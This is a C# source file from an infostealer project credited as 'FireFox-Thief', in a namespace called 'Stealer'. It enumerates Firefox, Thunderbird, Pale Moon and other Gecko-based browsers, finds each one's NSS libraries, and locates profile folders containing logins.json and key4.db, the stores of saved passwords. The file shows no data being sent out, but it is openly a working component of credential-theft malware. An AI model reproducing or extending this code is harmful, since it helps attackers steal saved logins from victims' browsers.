/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Helpers
{
    class Profile
	{
		public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		private static string[] GeckoBrowsersList = new string[]
		{
			"Mozilla\\Firefox",
			"Waterfox",
			"K-Meleon",
			"Thunderbird",
			"Comodo\\IceDragon",
			"8pecxstudios\\Cyberfox",
			"NETGATE Technologies\\BlackHaw",
			"Moonchild Productions\\Pale Moon"
		};
		
		// Get program files path
		private static string ProgramFiles()
		{
			if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
			{
				return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
			}

			return Environment.GetEnvironmentVariable("ProgramFiles");
		}

		// Get profile directory location
		public static string GetProfile(string path)
		{
			try
			{
				string dir = Path.Combine(path, "Profiles");
				if (Directory.Exists(dir))
					foreach (string sDir in Directory.GetDirectories(dir))
						if (File.Exists(sDir + "\\logins.json") || 
							File.Exists(sDir + "\\key4.db") || 
							File.Exists(sDir + "\\places.sqlite")) 
							return sDir;
			}
			catch (Exception ex) { Console.WriteLine("Failed to find profile\n" + ex); }
			return null;
		}

		// Get directory with nss3.dll
		public static string GetMozillaPath()
		{
			foreach (string sDir in Directory.GetDirectories(ProgramFiles()))
			{
				if (File.Exists(sDir + "\\nss3.dll") &&
					File.Exists(sDir + "\\mozglue.dll"))
					return sDir;
			}
			return null;
		}

		// Get gecko based browsers path
		public static string[] GetMozillaBrowsers()
		{
			List<string> foundBrowsers = new List<string>();
			foreach (string browser in GeckoBrowsersList)
			{
				string bdir = Path.Combine(Appdata, browser);
				if (Directory.Exists(bdir))
				{
					foundBrowsers.Add(bdir);
				}
			}
			return foundBrowsers.ToArray();
		}
	}
}
